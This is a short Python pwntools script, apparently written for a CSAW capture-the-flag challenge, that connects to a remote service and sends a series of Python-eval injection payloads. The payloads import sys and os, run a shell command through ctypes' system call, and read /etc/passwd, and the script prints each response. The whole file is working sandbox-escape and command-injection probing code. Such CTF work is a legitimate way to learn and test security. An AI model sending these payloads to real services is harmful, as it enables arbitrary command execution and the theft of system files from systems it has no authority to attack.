import pwn

HOST, PORT = 'misc.chal.csaw.io', 9998

payloads = [
    "1+1",
    "(__import__('sys').__stdout__.write('HI-A'+chr(10)), 0)[1]",
    "(__import__('os').getcwd(), 0)[1]",
    "(__import__('ctypes').CDLL(None).system(b'echo HI-C'), 0)[1]",
    "open('/etc/passwd').read()",
    "(print('HI-E'), 0)[1]",
]

for pl in payloads:
    try:
        p = pwn.remote(HOST, PORT)
        p.recvuntil(b'> ', timeout=5)
        p.sendline(pl.encode())
        out = p.recvall(timeout=6).decode(errors='replace')
        p.close()
    except Exception as e:
        out = 'ERR ' + str(e)
    print('==== PAYLOAD:', pl)
    print(out.strip()[:600])
    print()
end_of_edit

